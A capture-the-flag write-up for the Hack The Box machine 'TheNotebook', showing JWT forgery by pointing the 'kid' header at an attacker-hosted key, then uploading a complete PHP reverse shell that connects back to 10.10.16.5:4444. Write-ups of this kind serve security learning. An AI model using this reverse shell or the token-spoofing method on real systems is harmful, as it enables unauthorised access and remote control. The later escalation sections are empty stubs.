# Introduction

[![](https://www.hackthebox.eu/storage/avatars/7295ea27df8a46144ed5f939b96ffaae.png)](https://app.hackthebox.eu/machines/320)

| Point | Description |
| :------:| :------: |
| Name | TheNotebook  |
| OS   | Linux  |
| Difficulty Rating| Medium   |
| Release | 06 Mar 2021   |
| IP | 10.10.10.230   |
| Owned | 16 Mar 2021 |

# Short retelling

* Decode JWT
* Spoofing a private certificate
* Spoofing JWT with admin access
* Upload PHP Reverse Shell
* Find users's credentials in backups
* Get user.txt
* Using Runc's vulnerability
* Get root.txt

# Enumeration

## Nmap

Let's start reconing machine "TheNotebook" 10.10.10.230 with Nmap

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# nmap -sV -sC -p- 10.10.10.230 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 01:23 EDT
Nmap scan report for thenotebook.htb (10.10.10.230)
Host is up (0.27s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 655.13 seconds
```
We find 80/tcp and 22/tcp ports, so lets add *thenotebook.htb* to /etc/hosts and check website.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn1.PNG)

We see the web version of notebook. The message says that we need just to register. Let's do it.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn2.PNG)

After registeretion we get redirect to our home page.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn3.PNG)

Here we can write our notes.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn4.PNG)

CSRF and SSTI are not exploited.

Source code isn't interesting.

## Burp

So let's use Burp to check what data is sent to the web server.

Checking authorization form.

Web-form:

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn5.PNG)

The data is increpting by Burp:

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn6.PNG)

We see just interesting string in the filed *Cookie*.

Try to decode BASE64:

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InBhc2hhIiwiZW1haWwiOiJwYXNoYUB0aGVub3RlYmJvay5odGIiLCJhZG1pbl9jYXAiOnRydWV9.gkD2C8w7hcUF1QFLiOHhs4w-tfrsu6t7Px6aA4u0ROsnScjHtu0sXUHWM9-5Q1W7pprRv6ORq0YpXqRuDDpnq_uvuXslBGdsVUWbQYM6EHDq5ZBQtV3qKReUmWvK8TReKUKdGFl4KzaMPKL5Dz3z_Nj6Z7JcRap4FMiYXDbCESgERItzGALm8WzVH4kQ_cbXM2T7NHNZStFNFyJK3hQQItpNLE2UxvQ3y1rWOtfWETSrtiyq71_cOMwu9MJPXONyOyzceVGekkZLCxK4Eh1Jy2pQ-1qM3SL6Yqf6H2sshPswjvcJVAKdUjy-slTvyFd80SdXfXvSg9bb_yVWwBfEM0q_pw_96xERuvc_oY0dvOdUz954q5WRhpGisVoknG0jdEiC3wr9FFNOBXTVUVDsgE5BN1tN8M2CC7fgTrb9YOoYCpd8dWq4Zwcc9dnlpYR2DF0IQfLggMwYOcWLf0Ncqw7c5yBGIwe6nQGMrmZDXpwqkJRUvL5QGJ0N4smGJwxEWHcwNqDGk7Xj8sIeQjrq9c7XPIZeATShGmeQYT6SdKnZxGfic9bALsiRCT_BRZ7352LItWpIXLJSIaVoA6lWllgxlO0saW6iLDHiPILf3wkaMPROuQ8y-q7dpcgbob_A6X_PE_VST89uw6fIfeZj_VlfKa0P997IHYReDbIG21c' | base64 -d
{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}base64: invalid input
```

We get *typ: "JWT"* and understand that this web server is using JSON Web Token for authorization.

I think that is way to foothold.

# Explotation

Install module for JWT in burp we can read all information.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn7.PNG)

We can see interesting fields:

* "kid": "http://localhost:7070/privKey.key"
* "admin_cap": false

I think we need to change *admin_cap* to *true* and get probably admin access.

But if we simply change "admin_cap": true we will not get access.

Also I try to change "kid": "http://10.10.16.5:8000/" and we get connection from server.

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# ip a | grep tun                                                                                         1 ⨯
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    inet 10.10.16.5/23 scope global tun0
                                                                                                                
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.230 - - [17/Mar/2021 02:19:39] "GET / HTTP/1.1" 200 -
```

Interesting...

Google show me arcticles abot JWT:

* https://habr.com/ru/post/450054/
* https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a
* https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

Ok. we have token

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InBhc2hhIiwiZW1haWwiOiJwYXNoYUB0aGVub3RlYmJvay5odGIiLCJhZG1pbl9jYXAiOnRydWV9.gkD2C8w7hcUF1QFLiOHhs4w-tfrsu6t7Px6aA4u0ROsnScjHtu0sXUHWM9-5Q1W7pprRv6ORq0YpXqRuDDpnq_uvuXslBGdsVUWbQYM6EHDq5ZBQtV3qKReUmWvK8TReKUKdGFl4KzaMPKL5Dz3z_Nj6Z7JcRap4FMiYXDbCESgERItzGALm8WzVH4kQ_cbXM2T7NHNZStFNFyJK3hQQItpNLE2UxvQ3y1rWOtfWETSrtiyq71_cOMwu9MJPXONyOyzceVGekkZLCxK4Eh1Jy2pQ-1qM3SL6Yqf6H2sshPswjvcJVAKdUjy-slTvyFd80SdXfXvSg9bb_yVWwBfEM0q_pw_96xERuvc_oY0dvOdUz954q5WRhpGisVoknG0jdEiC3wr9FFNOBXTVUVDsgE5BN1tN8M2CC7fgTrb9YOoYCpd8dWq4Zwcc9dnlpYR2DF0IQfLggMwYOcWLf0Ncqw7c5yBGIwe6nQGMrmZDXpwqkJRUvL5QGJ0N4smGJwxEWHcwNqDGk7Xj8sIeQjrq9c7XPIZeATShGmeQYT6SdKnZxGfic9bALsiRCT_BRZ7352LItWpIXLJSIaVoA6lWllgxlO0saW6iLDHiPILf3wkaMPROuQ8y-q7dpcgbob_A6X_PE_VST89uw6fIfeZj_VlfKa0P997IHYReDbIG21c
```

And it has 3 parts decode in base64: header.payload.signature:

* Header - ALGORITHM & TOKEN TYPE:

```
──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9' | base64 -d
{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}
```

* Payload - DATA

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# echo 'eyJ1c2VybmFtZSI6InBhc2hhIiwiZW1haWwiOiJwYXNoYUB0aGVub3RlYmJvay5odGIiLCJhZG1pbl9jYXAiOnRydWV9' | base64 -d
{"username":"pasha","email":"pasha@thenotebbok.htb","admin_cap":true} 
```

* Verify signature

The signature is calculated by base64url encoding the header and payload and concatenating them with a period as a separator

```
key = 'privatekey'
unsignedToken = encodeBase64(header) + '.' + encodeBase64(payload)
signature = HMAC-SHA256(key, unsignedToken)
```
We can change data of headers and payload, but we can't create JWT token without signature. We need in private key for encode signature.

Remember, that we got connection to our host when we edited *kid*.

There is one idea, we can create own private key and public key, and try to upload private key to server with edition in *kid*.

Server download a privKey.key.

*.key* - format PEM of private key.

Generate private and public key of PEM format:

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key  
Generating public/private rsa key pair.

Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in privKey.key
Your public key has been saved in privKey.key.pub
The key fingerprint is:
SHA256:pi7wqj9fHjhhL7o1OLW8AnrSdJsaocn3QTHXKD+b2Kk root@kali
The key's randomart image is:
+---[RSA 4096]----+
|                 |
|        o        |
|     + o .       |
|      *          |
|  . +. oS        |
|ooo*o=oo=        |
|+=+=O===         |
|o *=*Oo.         |
|.=*BoEo          |
+----[SHA256]-----+
```

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# openssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub                                     1 ⨯
writing RSA key
```

Private key *ptivKey.key*

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# cat privKey.key   
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

Public key *privKey.key.pub*

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# cat privKey.key.pub 
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA4V7G/r8T3PliHwu6jERz
PTYg43zjO0uAqId9VLBtb7/qMpagB0QC8DDytCFFQA/CYymhbSPKkoj/ujSUDJjc
g3l2BiZnUa+GaYZtihNj+5w8oNKidTJZGcBraF39XYCDuHFlytvaH1k/cM9fFYj0
Kb6/Fn6GZZ+2FlF48xEjG3tjCS6bH0L3O7mn8NT0z9+15MD8NfUFvsOF+l3tw9T3
aKt9rRFtxXMDnDeFAjD09JGPChksJpWZuDfZBU2eqKUp9fNh7E3KeOV8n/XUVLK5
h5n9GvYnaUzke1aKRRufqUetfSfhw1uO65mNNDrBqx78CCM0nKRFtBbq6uWbrJiv
Pd6YITFOOD7/v/+Ly2OAMmduweku81Zl2Na8j/ppd+7PgCTmYjv12+xZs8JWpuM1
3xp8Z2F4mA0rbDhnVChp6SpjtTS2S5GBqss2o0LGXgfLSVnzajq5RyxSPtJInLNy
r1BbwRi1NdD6BtG1RbJrWRuTWfu56/ONNSBqxuC3RxC3Txy/1u+c095tLPKGUR3R
/DQhfTwjk+lzi9B672ymJaj4ntvOyhY7UEOiwwPvafItWL5/rphPstHaBgtgKAd/
vRiwBhpFbR2AUMIGjLIrldEFgVPTs0XMGWVk5QSTv+2e2BzFteFRWkSMVX4IY6bi
4c9besq8NVDE+HRtlUMaTJMCAwEAAQ==
-----END PUBLIC KEY-----
```

Now we go to https://jwt.io/

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn8.PNG)

Edit *headers* and *payload* and add our private and public key to generate signature.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn9.PNG)

We create JWT with admin's privilege.

JSON Web Token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNi41OjgwMDAvcHJpdktleS5rZXkifQ.eyJ1c2VybmFtZSI6InBhc2hhIiwiZW1haWwiOiJwYXNoYUB0aGVub3RlYmJvay5odGIiLCJhZG1pbl9jYXAiOnRydWV9.p1Xf2d6Xjad7En7ksPb2LrgrLQ7RsRoUAIVfIXWlNi2vq-cLKIXvIEEqbxwGryeV5V3Zte2Vpg73tY3yyn88EILV-8JevkE4PkOu1bSFiZIMBYEzvbzZK_0mBsA9MWVfdFOAwzS1LvtjQGMy3mFufrye7Rip_fDWDnTENQ9AfWhIWj5sG5INJQg-RI37DAfF4NniAD1cpluPiuhMiYisGZ7Nn78IX6vymq58PVIJiha2fzhSJQ-vMYRs_F5YIPp8QqXVQkLlFqgbmgAbie2-yWkcdlp0Qd6nyX7lOykDM1VYYV50g7wnlQQ4f34o_FqsSfpzg9HMIk4NQjnrMLMeKSMj7Zp1F7sICFOfGoaz9UcDVzUm9IkaCl0dUd_yRs6D9uCQyI7irCt0sWH4wBrOBdiNzVInjxq8P9lkhKf8RdGz8TsWdSwlsLxq1G-lpHwhkqDzKiEbwz4EYHds2tPZ9CvzRbaTwxzW59r6a6gBrlq0kUyTsT4rgiSyzELr8tLF8MtkMSL7_LyoKKBxRf0I4rKyfFbeOwJVH-99_z3-NraiDCjWcXMGePtR4VVu2paPwB9aki8oJ1VG9keSWZpA1HAaH4nD5kQXNA3AiWlcGlCyJlJs31q1Ghyl1vcGu2QHk8JzRck1kNcrzsvzbWansuTTlmme_VptavboiZFDmXQ
```

Let's go to authoriztion form with new token.

In the Burp Suite we need to write our JWT to *Cookie: auth = *

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn10.PNG)

Web server download our private key

```
──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.230 - - [17/Mar/2021 23:35:44] "GET /privKey.key HTTP/1.1" 200 -
```

And we get admin's access. We can see Admin Panel. ( Now in every redirect we need to replace JWT token with Burp)

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn11.PNG)

In Admin Panel we can see two buttons *View Notes* and *Upload File*

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn12.PNG)

Сheck them in order.

View Notes:

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn13.PNG)

Checking the note "Need to fix" and we see interestimng message :)

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn14.PNG)

And run to *upload file* to upload php reverse shell.

PHP reverse shell:

```                                                                                                                
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# cat rev.php        
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.5';
$port = 4444;      
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
```

Select our rev.php and save.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn15.PNG)

Start listener in kali and click "View"

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/tn16.PNG)

And we get reverse shell

```
┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
└─# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.16.5] from thenotebook.htb [10.10.10.230] 53804
Linux thenotebook 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 04:04:32 up 40 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
```

# Privilege Escalation#1

Upgrade reverse shell

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@thenotebook:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
```

We need to find way to privilege escalation, so run [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).



# Privilege Escalation#2



# Result and Resources

1. h
2. h

